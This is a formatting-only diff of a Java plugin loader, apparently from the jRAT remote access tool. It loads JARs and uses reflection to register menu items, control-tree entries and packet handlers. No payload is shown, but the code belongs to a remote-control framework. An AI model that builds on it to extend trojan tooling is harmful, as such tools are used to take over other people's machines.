@@ -23,8 +23,6 @@ import pro.jrat.api.events.OnSendPacketEvent;
 import pro.jrat.api.utils.JarUtils;
 import pro.jrat.common.Version;
 
-
-
 @SuppressWarnings({ "rawtypes", "unchecked", "deprecation" })
 public class Plugin {
 
@@ -47,13 +45,13 @@ public class Plugin {
 	public Plugin(File jar) throws Exception {
 		this(jar.getAbsolutePath());
 	}
-	
+
 	public Plugin(String file) throws Exception {
 		setJarName(file);
 		setLoader(new PluginClassLoader(new URLClassLoader(new URL[] { new File(file).toURL() }, Main.class.getClassLoader())));
-		
+
 		String mainClass;
-		
+
 		try {
 			mainClass = JarUtils.getMainClassFromInfo(new JarFile(file));
 		} catch (Exception ex) {
@@ -61,7 +59,7 @@ public class Plugin {
 			System.out.println("Failed loading main class from plugin.txt, trying meta-inf");
 			mainClass = JarUtils.getMainClass(new JarFile(file));
 		}
-		
+
 		setClassToLoad(Class.forName(mainClass, true, getLoader()));
 		setInstance(getClassToLoad().newInstance());
 
@@ -75,17 +73,16 @@ public class Plugin {
 		setName(getClassToLoad().getMethod("getName", new Class[] {}).invoke(getInstance(), new Object[] {}).toString());
 		this.setGlobalItemListener((ActionListener) getClassToLoad().getMethod("getGlobalMenuItemListener", new Class[] {}).invoke(getInstance(), new Object[] {}));
 
-
 		List<RATMenuItem> menuitems = (List<RATMenuItem>) getClassToLoad().getMethod("getMenuItems", new Class[] {}).invoke(getInstance(), new Object[] {});
 		if (menuitems != null) {
 			setItems(menuitems);
 		}
-		
-		List<RATControlMenuEntry> citems = (List<RATControlMenuEntry>) getClassToLoad().getMethod("getControlTreeItems", new Class[] { }).invoke(getInstance(), new Object[] { });
+
+		List<RATControlMenuEntry> citems = (List<RATControlMenuEntry>) getClassToLoad().getMethod("getControlTreeItems", new Class[] {}).invoke(getInstance(), new Object[] {});
 		if (citems != null) {
 			setControlitems(citems);
 		}
-		
+
 		Method onPacket = getClassToLoad().getMethod("onPacket", new Class[] { OnPacketEvent.class });
 		getMethods().put("onpacket", onPacket);
 
@@ -100,9 +97,9 @@ public class Plugin {
 
 		Method onSendPacket = getClassToLoad().getMethod("onSendPacket", new Class[] { OnSendPacketEvent.class });
 		getMethods().put("onsendpacket", onSendPacket);
-		
+
 		Main.debug("Plugin " + getName() + " " + getVersion() + " enabled");
-		
+
 		PluginLoader.register(this);
 	}
 
@@ -201,14 +198,14 @@ public class Plugin {
 	public void setGlobalItemListener(ActionListener globalItemListener) {
 		this.globalItemListener = globalItemListener;
 	}
-	
+
 	public boolean equals(Object o) {
 		if (o instanceof Plugin) {
-			Plugin plugin = (Plugin)o;
-			
+			Plugin plugin = (Plugin) o;
+
 			return plugin.name.equals(this.name);
 		}
-		
+
 		return false;
 	}
 
